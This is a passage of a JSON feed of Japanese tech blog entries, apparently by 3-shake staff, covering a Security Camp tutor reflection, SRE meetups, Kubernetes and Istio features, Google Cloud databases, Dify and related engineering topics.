義全体を俯瞰して見ることができ、受講生として参加したときよりも少しだけ気持ちに余裕が持てたのはよかったと思う。一方で、受講生の知識・スキルの高さには驚かされ、チューターと受講生というよりは、同じ関心を持つ同世代の仲間という気持ちで講義だけに限らず、休憩時間やご飯の時間も含めてたくさんの話ができたし、そのなかで勉強になることも多かった。チューターとして参加してみて、受講生が演習で困っているときに一緒に解決できたときには私も嬉しかったし、教えたり技術を広めることの面白さを少しだけ感じることができた気がする。セキュリティ・キャンプを修了した方には、チューターとしてセキュリティ・キャンプにもう一度参加することも検討に入れるのをお勧めしたい。感想どの講義も濃密で、チューターとして参加した今年も私にとって初めて知ることも多かった。勉強するきっかけをたくさん与えられるので、キャンプ中はもちろんのことキャンプ後も継続して勉強するネタが見つかるし、私自身これからもっと勉強したいと思う。また、受講生やチューターとして参加している同世代のすごい人たちやセキュリティの第一線で活躍している講師の方や関係者の方を見て話すことができ、今年もとても刺激を受けることができた。講義資料自体は講師の方が公開されているものも多くある（Bクラスの講義に限らず）ため、講師の方と話したり、みんなで議論したりできることこそがセキュリティ・キャンプに参加することの一番のよさであると思う。セキュリティに興味がある人はもちろん、もっと広くコンピュータに興味がある人全員にセキュリティ・キャンプを勧めたい。昨年書いていたので、今年も書いておこうと思う。来年はネクストの受講生としてまた戻ってきたい。Bクラス ほかの方のブログhack.nikkei.comzenn.dev","isoDate":"2024-08-31T03:18:36.000Z","dateMiliSeconds":1725074316000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"SRETT#10 ~ 夏のSRE祭り！アーカイブ動画公開！","link":"https://shu-kob.hateblo.jp/entry/2024/08/30/230631","contentSnippet":"shu-kob.hateblo.jp2024年8月23日に弊社スリーシェイクのコミュニティ勉強会「SRETT #10 ~ 夏のSRE祭り！」が開催されました。www.youtube.comアーカイブ動画も公開されています！当日ご参加できなかった方もぜひご覧ください！自分は当日誘導係をやっていて、最初の菱田さんのセッション「SRE NEXT 2024 で形にしたバトンを渡せる仕組み」は最後のちょびっとだけしか聴けていないから、観ようかな。","isoDate":"2024-08-30T14:06:31.000Z","dateMiliSeconds":1725026791000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"オライリーのAWS生成AI本","link":"https://shu-kob.hateblo.jp/entry/2024/08/29/234143","contentSnippet":"AWSではじめる生成AI ―RAGアプリケーション開発から、基盤モデルの微調整、マルチモーダルAI活用までを試して学ぶ作者:Chris Fregly,Antje Barth,Shelbee EigenbrodeオライリージャパンAmazonそういや、オライリージャパンからAWSの生成AI本出てますね。欲しいと思いながらも買うてない。現状、自身の仕事のほとんどはGoogle cloudなので、AWS書籍どうしようかと思ってますが、面白そうなら買うてみるしか！翻訳はAWS Japanの久富木 隆一さん。AWSの中の人が翻訳しているので確かでしょうね！","isoDate":"2024-08-29T14:41:43.000Z","dateMiliSeconds":1724942503000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"「SREをはじめよう」(Becoming SRE邦訳)が出版","link":"https://shu-kob.hateblo.jp/entry/2024/08/28/235736","contentSnippet":"SREをはじめよう ―個人と組織による信頼性獲得への第一歩作者:David N. Blank-EdelmanオライリージャパンAmazon「Becoming SRE」の邦訳である「SREをはじめよう」が2024/10/8オライリージャパンから発売されます！翻訳は、オライリーのSRE系の邦訳を数多く手掛けられてきた山口 能迪さん（Google所属）個人がSREになる、組織がSREになるという二面で書かれているようで、今からとても楽しみです！","isoDate":"2024-08-28T14:57:36.000Z","dateMiliSeconds":1724857056000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloud エンジニアおよび Google Cloud パートナー2社による生成AI利活用を進めるためのプロセス","link":"https://shu-kob.hateblo.jp/entry/2024/08/27/235840","contentSnippet":"pages.sreake.comイベントで登壇していました。ご参加くださった方はありがとうございました！良い評価をいただけたようで光栄です！今回、「生成AI利活用を進めるためのプロセス」というテーマだったので、普段私があまり話さないことも話せて新鮮でした。genai-users.connpass.com普段は、日本生成AIユーザ会でハンズオンをやっているように、具体的技術を話すことが多いので。今回とても良い経験になりました。今後も良い発表ができるよう精進していきます！","isoDate":"2024-08-27T14:58:40.000Z","dateMiliSeconds":1724770720000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"VPC Latticeについて","link":"https://zenn.dev/k_nagase/articles/vpc_lattice_basic","contentSnippet":"VPC LatticeとはVPC Latticeはサービス間を接続し、監視・通信の暗号化・認証認可などの機能を提供するサービスです。いわゆるLinkerdやIstioのようなサービスメッシュツールのようなイメージで利用できます。具体的には以下のような機能があります。サービス間通信における認証機能(IAM)アクセスログやメトリクスの収集などのモニタリングサービスディスカバリmTLS化ユーザ定義のカスタムドメインでの名前解決 ユースケース複数のプロダクトを各チームが個別にAWSアカウント単位またはVPC単位で管理しており、それらをメッシュ上に通信可能にするような...","isoDate":"2024-08-27T07:38:56.000Z","dateMiliSeconds":1724744336000,"authorName":"Kohei Nagase","authorId":"k-nagase"},{"title":"後継者不足のCOBOLを生成AIに引き継ぎ","link":"https://shu-kob.hateblo.jp/entry/2024/08/26/235854","contentSnippet":"www.itmedia.co.jpIT media AI+より。虚構新聞かと思いましたが（笑）、本当にようです。ベトナムの研究者が論文を出したのですね。日本でもCOBOLで書かれたシステムはまだまだ残っていますが、COBOL書けるエンジニアが高齢になってきて、後継者不足でもあります。海外もベトナムも同様なのですね。リプレイスしていくのも大事かと思いますが、全部のCOBOLシステムのリプレイスも難しいでしょうし、リプレイスしつつも、生成AIに書かせるのが現実解なのかもしれません。","isoDate":"2024-08-26T14:58:54.000Z","dateMiliSeconds":1724684334000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"IstioのサイドカーコンテナをKubernetesのサイドカーコンテナ機能で起動する","link":"https://zenn.dev/k_nagase/articles/istio_native_sidecar","contentSnippet":"はじめにKubernetes v1.29からサイドカーコンテナ機能が実装されました。これはメインコンテナとは別にロギングやプロキシのような周辺機能を追加するための機能です。Istioでもネットワークプロキシとしてenvoyコンテナをメインコンテナとは別にインジェクションし、1つのPodに仕立て上げます。しかしこれには問題があり、Jobを起動した際にメインコンテナが正常終了した後でもenvoyが終了せずにPodが残り続けてしまうといった事象がありました。こういったIstio利用における問題点を解消するのにKubernetesネイティブなサイドカーコンテナ機能が役立ちます。以降...","isoDate":"2024-08-26T04:15:35.000Z","dateMiliSeconds":1724645735000,"authorName":"Kohei Nagase","authorId":"k-nagase"},{"title":"生成AIアプリケーション開発ノーコードフレームワークDify","link":"https://shu-kob.hateblo.jp/entry/2024/08/25/233704","contentSnippet":"dify.ai最近、Difyの話題をよく聞くので、軽くご紹介したいと思います。Difyとは？ 生成AIアプリ開発を劇的に簡素化するプラットフォームDifyは、生成AIアプリケーションをノーコードで開発できる、非常に革新的なプラットフォームです。これまで、生成AIアプリの開発は、高度なプログラミングスキルを必要とし、専門エンジニアでなければ実現が難しいものでした。しかし、Difyの登場により、この状況が一変。非エンジニアでも、直感的な操作で複雑なAIアプリケーションを構築できるようになりました。Difyが選ばれる理由ノーコード開発: プログラミングの知識がなくても、ブロックを組み合わせるように視覚的にアプリを構築できます。RAG（Retrieval Augmented Generation）対応: 大規模言語モデル（LLM）と外部データソースを連携させ、より高度なAI機能を実現できます。オープンソース: プラットフォーム自体がオープンソースであり、自由にカスタマイズ・拡張できます。高機能: チャットボット、AIアシスタント、要約ツールなど、さまざまなタイプの生成AIアプリを開発可能です。企業との連携: 既存の企業システムとの連携もスムーズに行え、業務効率化に貢献します。Difyの主な特徴柔軟性: AIプロセスを自由に組み合わせて、柔軟なアプリケーションを開発できます。統合性: 既存のシステムとの連携が容易で、企業内の既存のデータやシステムと統合できます。監視性: 実行時の状況を監視し、AIモデルの性能を継続的に改善できます。スケーラビリティ: 需要に応じて、簡単にシステムを拡張できます。Difyでできることチャットボットの開発: 自然な会話ができるチャットボットを簡単に作成できます。AIアシスタントの開発: 顧客対応や業務支援を行うAIアシスタントを開発できます。文書の自動生成: レポートや記事などを自動生成できます。データ分析: 大量のデータを分析し、有益な情報を抽出できます。Difyが注目される理由生成AIの民主化: 生成AIの技術を、より多くの人々に開放し、AIの活用範囲を広げます。開発コストの削減: 高度なエンジニアを雇用する必要がなく、開発コストを大幅に削減できます。開発期間の短縮: ノーコード開発により、開発期間を大幅に短縮できます。まとめDifyは、生成AIの開発を劇的に簡素化するプラットフォームです。非エンジニアでも、高度なAIアプリケーションを開発できるため、生成AIの活用範囲が大きく広がることが期待されています。もし、生成AIに興味があり、独自のアプリケーションを開発したいと考えているのであれば、Difyは非常に魅力的な選択肢と言えるでしょう。さらに詳しく知りたい方へDify公式サイト: https://dify.ai/jpDifyの始め方（非エンジニアでも生成AIアプリが作れる最強ツール）: https://zenn.dev/en2enzo2/articles/824877e1099508Difyは、生成AIの分野で注目を集めているプラットフォームです。ぜひ、この機会にDifyについて詳しく調べてみてください。何か他に知りたいことがあれば、お気軽にご質問ください。","isoDate":"2024-08-25T14:37:04.000Z","dateMiliSeconds":1724596624000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"高度情報の午前Ⅱ試験を解くならこのサイト","link":"https://shu-kob.hateblo.jp/entry/2024/08/24/225803","contentSnippet":"もうすぐ9月。秋の情報処理技術者試験も近づいてますね。私はプロジェクトマネージャ試験を受けるので頑張らねば。応用情報午前試験の過去問アプリはたくさんあるのですが、高度情報はないですよね。IPA公式の過去問をPDFで開かずとも、スマホで気軽に過去問演習したいところ。そこで、高度情報の午前Ⅱ試験を解くならこのサイトをご紹介したいと思います。情報処理技術者試験の勉強(過去問題)をやり直し過去問を1問1答形式で時進められます。全ての高度情報に対応しています。こちらを活用して、午前Ⅱは余裕で通過できるようにしておきましょう１","isoDate":"2024-08-24T13:58:03.000Z","dateMiliSeconds":1724507883000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"3-shake SRE Tech Talk #10無事終了。英語は大事w","link":"https://shu-kob.hateblo.jp/entry/2024/08/23/231736","contentSnippet":"3-shake.connpass.comshu-kob.hateblo.jp初のオンサイト開催となる3-shake SRE Tech Talk #10無事終了しました。詳しいことは後日書くとして、私は誘導係をしました。会場となったGoogleさんの渋谷オフィスは渋谷ストリームという新しい建物にあるのですが、エントランスの長いエスカレータの下で誘導していたら外国人2組に道を聞かれました（笑）スリーシェイクTシャツ着て立っていたから、建物の係りの人と思われた？1人目の方には、スマホを見せられ、渋谷ストリーム内の串カツ屋の場所を聞かれました。飲食店マップがあったので、3Fか4Fにあるみたい、と拙い英語で説明w2組目の二人には、スマホを見せられ、半蔵門線渋谷駅の場所を聞かれました。エスカレータを指差し、「（エスカレータを）Down, Purple is Line Color.（半蔵門線のラインカラーは紫）」とまた拙い英語で説明したら、「ありがと！（Arigato）」とお礼を言われました。面白い経験をするとともに、Googleの音声翻訳など便利なものを使えばよかったと思いました。今後はもうちょっとまともな英語を答えられるよう頑張るぞ！","isoDate":"2024-08-23T14:17:36.000Z","dateMiliSeconds":1724422656000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"2024年8月23日(金)は渋谷とオンラインにて3-shake SRE Tech Talk #10","link":"https://shu-kob.hateblo.jp/entry/2024/08/22/214001","contentSnippet":"shu-kob.hateblo.jp以前も書きましたが、2024年8月23日(金)は渋谷とオンラインにて3-shake SRE Tech Talk #10 です。初のオンサイト開催！（オンラインも併用）18:30からGoogle Cloudさんの渋谷オフィスで行います。無料の懇親会もあります。オンサイトは定員40人のところ、前日の8月22日21:36現在、37人と、3人の空きがあります。タイムテーブルはこちら株式会社Topotal 菱田 健太氏「SRE NEXT 2024 で形にしたバトンを渡せる仕組み」株式会社スリーシェイク 阿部貴晶「LLMのO11yに触れる」グーグルクラウドジャパン合同会社 中谷 祐輔氏「スポンサーセッション」弊社スリーシェイクからは「LLMのO11yに触れる」というテーマで、生成AIのオブザーバビリティの話があります。私も会場誘導係として、参加予定です。生成AIに興味ある方もぜひご参加ください。","isoDate":"2024-08-22T12:40:01.000Z","dateMiliSeconds":1724330401000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cloud Run 上の Next.js を OpenTelemetry で計装する","link":"https://zenn.dev/kimitsu/articles/nextjs-otel-on-cloud-run","contentSnippet":"Cloud Run はコンテナ化されたアプリケーションを実行するための Google Cloud のフルマネージドサービスです。Google Cloud 上でコンテナアプリを動かす場合、Cloud Run がファーストチョイスとなります。Next.js のデプロイ先としては Vercel が有名ですが、Google Cloud 上で動かしたい場合は Cloud Run になるでしょう。Next.js には Experimental ではありますが OpenTelemetry サポートがあり、Vercel でも Pro 以上のプランにすることでテレメトリを収集することができます。今...","isoDate":"2024-08-17T14:41:05.000Z","dateMiliSeconds":1723905665000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"SRE支援の効果的なアプローチについて(SRE NEXT 2024登壇のRecap)","link":"https://zenn.dev/kojake_300/articles/b977011a04fce4","contentSnippet":"この記事は、SRE NEXT 2024で、株式会社スリーシェイクのスポンサーセッションとして登壇した「内製化を見据えた効果的なSRE支援のアプローチ」をセルフでRecapしたものになります。 はじめに株式会社スリーシェイクのSreake事業部に所属しています。2024年8月3日、4日に開催された SRE NEXT 2024 に「内製化を見据えた効果的なSRE支援のアプローチ」という題で登壇しました。20分の枠なのに60枚弱のスライドを作成するという暴挙に出てしまい、端折りながらの説明となってしまったため、Recapとして登壇内容を解説します。 想定読者本登壇資料は、SRE...","isoDate":"2024-08-08T09:18:01.000Z","dateMiliSeconds":1723108681000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"【SRE-NEXT 2024】内製化を見据えた効果的なSRE支援のアプローチ / SRE support approach","link":"https://speakerdeck.com/kojake_300/sre-next-2024-nei-zhi-hua-wojian-ju-etaxiao-guo-de-nasrezhi-yuan-noapuroti","contentSnippet":"","isoDate":"2024-08-03T04:00:00.000Z","dateMiliSeconds":1722657600000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Node.jsバージョン管理 n コマンドについて","link":"https://www.rowicy.com/blog/n-command/","contentSnippet":"Node.jsを簡単に管理できるツールnコマンドを紹介します。","isoDate":"2024-07-30T00:00:00.000Z","dateMiliSeconds":1722297600000,"authorName":"riiim","authorId":"riiim"},{"title":"Burp Suite Extension を作ってみました","link":"https://www.rowicy.com/blog/burpex-burpee/","contentSnippet":"今回は個人的に開発したBurp Suite拡張機能と、開発してみての体験談を紹介します。","isoDate":"2024-07-28T00:00:00.000Z","dateMiliSeconds":1722124800000,"authorName":"riiim","authorId":"riiim"},{"title":"Raspberry Pi 4 での USB Strage Driver","link":"https://blog.1q77.com/2024/07/raspberry-pi4-usb-strage-driver/","contentSnippet":"ラズパイが時々ハングアップするおうちの Raspberry Pi4 は USB で SSD Driver を接続して Samba で File Server にしているわけですが多くの Read/Write を行うとなぜか OS ごと Hangup するという問題がありました。最初は電源不足かなと思って電源を交換したりもしたのですが改善しませんでした。電源は TP-Link の HS105 経由にしているのでハングアップしたらリモートで電源 Off / On して復旧させていたわけですが不便なのでググって別の解決策を探してみたところそれらしいものがあったのでメモ。(HS105 は生産も終了しており、後継は Tapo P110M のようです)","isoDate":"2024-07-20T10:19:30.000Z","dateMiliSeconds":1721470770000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"モダンインフラの基礎を学ぼう！実践コンテナ入門","link":"https://speakerdeck.com/bells17/motaninhuranoji-chu-woxue-hou-shi-jian-kontenaru-men","contentSnippet":"技育CAMPアカデミアでの発表資料です\\rhttps://talent.supporterz.jp/events/8cb9a300-506c-4d9d-b2af-e9924e0209a2/","isoDate":"2024-07-17T04:00:00.000Z","dateMiliSeconds":1721188800000,"authorName":"bells17","authorId":"bells17"},{"title":"Grafana Beylaの出来るコト出来ないコト","link":"https://zenn.dev/kojake_300/articles/4238a66124d095","contentSnippet":"この記事は、2024/6/28に登壇したJagu\'e\'r Jagu\'e\'r O11y-SRE \xd7 CloudNative コラボ Meetupのリマスターになります。 分散トレーシングの悩み突然ですが皆さん、分散トレーシングを実装する際、一度はこんなことを考えた経験はありませんか？特にクラウドインフラ出身の私は、意気揚々と分散トレーシングを実装しようとした時に、アプリケーションコードが書けずに全く歯が立たなかった苦い経験があります。。。でも、、ということで、本記事ではBeylaとは何者なのか、従来の分散トレーシングとは何が違うのかを解説していきます！\uD83D\uDCAA 分散トレーシ...","isoDate":"2024-07-15T15:07:47.000Z","dateMiliSeconds":1721056067000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"「Efficient Linux コマンドライン」から学んだこと","link":"https://zenn.dev/moz_sec/articles/2a849651de3fe1","contentSnippet":"はじめに本記事では、「Efficient Linux コマンドライン」を読んで、私自身が新たに学んだことについてメモしています。私がすでに知っていた情報については本記事に書いていないため、興味があればお手元に買って読んでみてください。この記事には書いていないこともたくさん書いてあります。この本の対象読者としては、Linuxの勉強を1からしたい人というよりは、Linuxをそこそこ触ったことがある人になると思います。\\"そこそこ触ったことがある\\"のレベルとしては、コマンドでディレクトリを変更したり、プログラムを実行したりしていれば十分です。336ページとそこまで長くもなく、またLi...","isoDate":"2024-07-15T08:51:51.000Z","dateMiliSeconds":1721033511000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Lookerでもpivotがしたい!!","link":"https://zenn.dev/nedoko_dok0dko/articles/8c70b7bfa0cef4","contentSnippet":"whatLooker上でpivotテーブルができるかを調べてやってみたメモ Q． Lookerでpivotできるの…？A.できるhttps://www.cloudskillsboost.google/course_templates/323/video/432948?locale=jaLooker自身の仕様上、ExcelやLooker Studioのような操作感と少し違う点に注意。 対応グラフ表グラフ表グラフ(レガシー) やってみるExplorerを利用してできるので、簡単なデータを入れたテーブルを用意してやってみる。 利用環境データソース:...","isoDate":"2024-07-02T14:05:01.000Z","dateMiliSeconds":1719929101000,"authorName":"seno","authorId":"seno"},{"title":"eBPFで計装はノーコードの時代へ Grafana Beylaの出来るコト出来ないコト","link":"https://speakerdeck.com/kojake_300/ebpfdeji-zhuang-hanokodonoshi-dai-he-grafana-beylanochu-lai-rukotochu-lai-naikoto","contentSnippet":"","isoDate":"2024-07-01T04:00:00.000Z","dateMiliSeconds":1719806400000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"【Kubernetes☸️】\\"Findy 開発生産性 Conference\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2024/07/01/120000","contentSnippet":"発表スライドから得られる知識イベント名登壇映像文字起こし謝辞発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️プラットフォーム設計導入のために、横断的コミュニケーションが必要であるプラットフォームエンジニアリングで、マルチプロダクトの生産性を支えるプラットフォームエンジニアリングで、各マイクロサービスの生産性を支えるみんな！スライドぜってぇ見てくれよな！イベント名オッス！オラ長谷川！✋\uD83C\uDFFB『マルチプロダクトの組織でマイクロサービスアーキテクチャを支えるCICDプラットフォーム設計』ていうテーマで、 Findy 開発生産性 Conference に登壇したぞ！『Findy開発生産性Conference』の発表資料です✊\uD83C\uDFFBオラたちのプラットフォームエンジニアリング事例を紹介してっから、ぜってぇ見てくれよな！✋\uD83C\uDFFB#開発生産性con_findyhttps://t.co/DjqztPn9z4— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) June 28, 2024 ちな、発表内容はこの記事にも関連してるぜ！登壇映像Findyさんが登壇の映像を公開してくれました\uD83C\uDFA5文字起こしFindyさんが発表を文字起こししてくれました\uD83D\uDDE3️謝辞感謝するぜ！イベントで出会えた全ての方々に！！！\uD83E\uDEF6\uD83C\uDFFB株式会社スリーシェイクのブースにお邪魔させていただきました\uD83D\uDE4C#3shake_inc pic.twitter.com/W7ufgaKfbS— すてにゃん (@stefafafan) June 29, 2024","isoDate":"2024-07-01T03:00:00.000Z","dateMiliSeconds":1719802800000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"♾️ マルチプロダクトの巨大組織でマイクロサービス開発を支えるCICDプラットフォーム設計","link":"https://speakerdeck.com/hiroki_hasegawa/marutipurodakutonozu-zhi-demaikurosabisuakitekutiyawozhi-erucicdpuratutohuomushe-ji","contentSnippet":"\\"Findy開発生産性Conference\\" の発表資料です✊\uD83C\uDFFB\\r\\r生産性を支えるためのプラットフォームエンジニアリング事例として、以下の３つの取り組みを紹介しました！\\r\\r・プラットフォーム設計導入のために、横断的コミュニケーションが必要である\\r・プラットフォームエンジニアリングで、マルチプロダクトの生産性を支える\\r・プラットフォームエンジニアリングで、各マイクロサービスの生産性を支える\\r\\r❓ はてなぶろぐ記事：https://hiroki-hasegawa.hatenablog.jp/entry/2024/07/01/120000\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1806559579180011572\\r\\r✍\uD83C\uDFFB 社内レポート：https://note.3-shake.com/n/n8efac1be167d\\r\\r\uD83D\uDDE3️ 発表文字起こし：https://findy-code.io/engineer-lab/dev-productivity-con-2024-3shake\\r\\r\uD83D\uDCFA 動画：https://www.youtube.com/watch?v=88wTolxNjDk&t=1240s","isoDate":"2024-06-28T04:00:00.000Z","dateMiliSeconds":1719547200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"おまえらのFizzBuzzは間違っている(Go オブジェクト指向)","link":"https://zenn.dev/kamos/articles/ce9ff83b90abbc","contentSnippet":"はじめに釣りタイトルですまん。この記事は社内勉強会向けに作成した内容をZenn向けに再編集したものです。ソースコードhttps://github.com/Mkamono/objective-fizz-buzz 種本「ちょうぜつソフトウェア設計入門 PHPで理解するオブジェクト指向の活用」の5-3を参考にしました。https://amzn.asia/d/ewM0dJ1 突然ですが、FizzBuzzを書いてみてくださいはい。頑張ってください。要求は以下のとおりです。1以上の整数値が入力として渡される3の倍数のときは\\"Fizz\\"と出力する5の倍数のときは\\"B...","isoDate":"2024-06-25T14:10:37.000Z","dateMiliSeconds":1719324637000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"あまり知られていないLaravelのコレクションメソッド #2: concat","link":"https://qiita.com/aminevg/items/8c3fbd6c7381836a4055","contentSnippet":"目次あまり知られていないLaravelのコレクションメソッド #1: macroあまり知られていないLaravelのコレクションメソッド #2: concat （本記事）背景Laravelのコレクション、使いこなしていますか？以下の記事を先程読んで面白いと...","isoDate":"2024-06-19T11:18:31.000Z","dateMiliSeconds":1718795911000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"Taskfileを有効活用して、Makefileのシェル芸から逃げる","link":"https://zenn.dev/kamos/articles/fc94a7e73a9ad5","contentSnippet":"はじめに皆さん、Makefileは使っていらっしゃるでしょうか？Makefileは、ソフトウェアのビルドプロセスを自動化するための設定ファイルです。主にUNIX系OSで使用され、プログラムのコンパイル、リンク、インストールなどの手順を記述することで、簡単に実行できます。今回はBetter MakefileとしてTaskfileを紹介したいと思います。!Makefileはmakeコマンドによって実行されるファイルのことを指します。この記事では簡単のため、makeコマンドとMakefileを区別せず、ほぼすべての部分でMakefileと記載します。Taskfileもtaskコ...","isoDate":"2024-06-15T07:41:22.000Z","dateMiliSeconds":1718437282000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Test Suiteってなに？","link":"https://qiita.com/m_pig/items/b2687df1da94edcaba89","contentSnippet":"記事を書くきっかけGoで自動テストを作成する際にstretchr/testifyを使用しているのですが、suiteをよく使います。最初はライブラリ特有のものと思いsuiteについて調べていたのですが、Test suiteという言葉があったことに驚きこの記事を書こうと思い...","isoDate":"2024-06-14T09:45:58.000Z","dateMiliSeconds":1718358358000,"authorName":"Yushin Matsuura","authorId":"matsuura"},{"title":"API設計時に役立つAPIリファレンス一覧","link":"https://qiita.com/m_pig/items/a87248bcb0d783bd386b","contentSnippet":"この記事についてGolangでAPIを開発している際に参考にしたAPI referenceを自分のメモがてら書いていきます。google APIsgoogleのドキュメントでは画面右側から API exploreを使用して簡単にAPIを叩くことができるので実際のデ...","isoDate":"2024-06-10T00:56:48.000Z","dateMiliSeconds":1717981008000,"authorName":"Yushin Matsuura","authorId":"matsuura"},{"title":"Google Cloud主催パートナー向けイベントで「Google Cloud で利用できるRDBのベクトル検索を徹底解剖！」を話しました。","link":"https://zenn.dev/nnaka2992/articles/compare_vector_searches_on_google_clouds_rdb","contentSnippet":"2024年6月5日にGoogle Cloudがパートナー向けに開催したデータ関連の非公開イベントで「Google Cloud で利用できるRDBのベクトル検索を徹底解剖！」というLTを話しました。https://speakerdeck.com/nnaka2992/google-cloud-deli-yong-dekirurdbnobekutorujian-suo-woche-di-jie-pou非公開イベントのため録画がなかったり、LT枠だった関係で省略してしまった部分があったりしたためブログでより詳細な説明資料のようなものを書きました。 背景Google Cloudが提供する...","isoDate":"2024-06-09T22:00:00.000Z","dateMiliSeconds":1717970400000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Cloud SQL for PostgreSQLのベクトル検索を試す","link":"https://zenn.dev/nnaka2992/articles/play_with_cloud_sql_vector_search","contentSnippet":"Google Cloud Next \'24でGoogle Cloudが提供するすべてのマネージドデータベースにベクトル検索の機能が追加されました。[1]今回はそのなかのCloud SQL for PostgreSQLにフォーカスしてベクトル検索機能を試します。 Cloud SQL for PostgreSQL インスタンススペックエディションEnterprisevCPU2RAM8GBストレージタイプSSDZoneasia-northeast1接続パブリックIPを有効化 必要な設定を行うデータベースを作成す...","isoDate":"2024-05-26T15:54:14.000Z","dateMiliSeconds":1716738854000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"セキュリティ人材になるために/becoming a security personnel","link":"https://speakerdeck.com/moz_sec_/becoming-a-security-personnel","contentSnippet":"2024年5月23日に行われたランチタイムトークで登壇した資料です。","isoDate":"2024-05-23T04:00:00.000Z","dateMiliSeconds":1716436800000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Kubernetes Code Contribution入門","link":"https://speakerdeck.com/bells17/kubernetes-code-contributionru-men","contentSnippet":"Kubernetes Novice Tokyo #32 で登壇したセッションの資料です。\\rhttps://k8s-novice-jp.connpass.com/event/317561/\\r\\r配信URL:\\rhttps://www.youtube.com/live/sRLG9ufaZ4M","isoDate":"2024-05-21T04:00:00.000Z","dateMiliSeconds":1716264000000,"authorName":"bells17","authorId":"bells17"},{"title":"サイバーセキュリティの最新動向：脅威と対策","link":"https://speakerdeck.com/kyohmizu/saibasekiyuriteinozui-xin-dong-xiang-xie-wei-todui-ce","contentSnippet":"セミナー登壇資料です。2024/05/21\\rhttps://pages.securify.jp/event-seminar-20240521.html","isoDate":"2024-05-21T04:00:00.000Z","dateMiliSeconds":1716264000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Oracle Dataabse 19cの検証環境が欲しいからProxmoxに環境構築する","link":"https://zenn.dev/nnaka2992/articles/install_oracle_19c_to_proxmox","contentSnippet":"概要300年ぶりぐらいに、ローカル環境(非Cloud環境)でホストしたOracle Databaseが欲くなったので、自宅にあるProxmoxへインストールします。 前提Proxmoxにダウンロード済みのOracle Linux 9のイメージを利用する。利用するOracle Databaseは19cとする。検証環境のため本番用途に適した設定ではない。 Proxmox VMを建ち上げる Oracle Database 19cのサーバ要件今回関係あるもののみ抜粋しています。OSOracle Linux 9およびRed Hat互換カーネル: 5.14.0-...","isoDate":"2024-05-19T14:18:18.000Z","dateMiliSeconds":1716128298000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"CloudSQL for PostgreSQLのベンチマークと比較して理解するAlloyDBの特徴","link":"https://zenn.dev/nnaka2992/articles/compare_alloydb_and_postgres","contentSnippet":"概要Google Cloudが提供するPostgreSQL互換データベースであるAlloyDBのパフォーマンスをトランザクション用途・分析用途の双方から検証する。今回の検証ではAlloyDBの上限を見定めるのではなく、CloudSQLと比べてどのようなパフォーマンスになるを目的とする。 TL;DR絞り込み条件がインデックスに限定されない場合、AlloyDBのパフォーマンスメリットが特に大きくなる。絞り込み条件がインデックスに限定され、かつデータサイズが小さい場合、CloudSQL for PostgreSQLのコストパフォーマンスが大きくなる。現将・将来のワークロード...","isoDate":"2024-05-17T15:16:13.000Z","dateMiliSeconds":1715958973000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[Kubernetes 1.30] kube-proxy の nftables モード","link":"https://zenn.dev/toversus/articles/dcb888d73f0615","contentSnippet":"kube-proxyService へのトラフィックをプロキシするコンポーネントのデフォルト実装e.g.) Cluster IP への通信を Pod IP にリダイレクトするEndpointSlice, Service, Node などのオブジェクトの変更を検知して Service を介したトラフィックのルーティングを可能にするContainer Network Interface (CNI) vs kube-proxyCNI が Pod 間で通信できるように Pod IP の払い出しやルーティングをセットアップするPod は一時的なものかつ Pod ...","isoDate":"2024-05-16T23:43:33.000Z","dateMiliSeconds":1715903013000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Dev ContainersとTestcontainers","link":"https://speakerdeck.com/bells17/devcontainerstotestcontainers","contentSnippet":"TechFeed Experts Night#28 〜 コンテナ技術最前線 〜で登壇したセッションの資料です。\\rhttps://techfeed.io/events/techfeed-experts-night-28","isoDate":"2024-05-08T04:00:00.000Z","dateMiliSeconds":1715140800000,"authorName":"bells17","authorId":"bells17"},{"title":"[Kubernetes 1.30] Dynamic Resource Allocation の再構築","link":"https://zenn.dev/toversus/articles/5bbd68e507f28d","contentSnippet":"!Kubernetes 1.30 時点でアルファ機能のため、実装が大きく変わる可能性があります。[Kubernetes 1.27] Dynamic Resource Allocation のいまで紹介した Dynamic Resource Allocation (DRA) の内部的な仕組みに Kubernetes 1.30 で大きく変更が入ることになりました。内部的な仕組みの変更なので、ユーザー視点ではこれまでと利用方法は変わりません。ResourceClass に追加されたフィールドを有効にしないと新しい仕組みが使えないため、クラスタ管理者は対応が必要になります。世界的に 